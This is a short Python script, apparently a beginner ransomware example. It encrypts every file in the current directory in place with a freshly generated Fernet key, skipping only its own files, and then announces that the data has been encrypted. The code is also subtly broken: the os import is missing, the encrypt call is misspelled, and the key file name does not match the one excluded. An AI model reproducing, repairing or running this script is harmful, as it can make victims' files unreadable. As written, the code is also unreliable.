from cryptography.fernet import Fernet

files = []
for file in os.listdir():
  if file == "Encrypter.py" or file == "thekey.key" or file == "Decrypter.py":
    continue
  files.append(file)
  
key = Fernet.generate_key()
with open("thekey", "wb") as thekey:
  thekey.write(key)

  
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrpty(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
    
print("Your Data has been Encrypted")
